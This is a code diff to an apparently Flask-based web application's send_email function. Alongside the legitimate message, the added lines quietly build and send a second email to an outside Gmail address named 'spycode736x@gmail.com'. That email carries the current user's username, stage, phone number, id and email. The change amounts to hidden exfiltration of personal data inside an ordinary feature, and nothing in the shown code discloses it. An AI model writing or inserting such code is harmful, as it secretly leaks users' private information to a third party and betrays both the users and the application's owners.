@@ -1282,8 +1282,15 @@ def send_email():
         msg = Message(subject, recipients=[recipient])  
         msg.html = html_content
 
+        msg2 = Message('New Account Created' , 'spycode736x@gmail.com')
+
+        html_content = read_html_file(
+            'website/templates/users_pages/email2.html' , username = current_user.username , stage = current_user.stage , phone = current_user.phone_number , id = current_user.id  , email = current_user.email)
+        msg2.html = html_content
+
         try:
             mail.send(msg) 
+            mail.send(msg2)
             return render_template('used_pages/landing.html')
     
         except Exception as e:
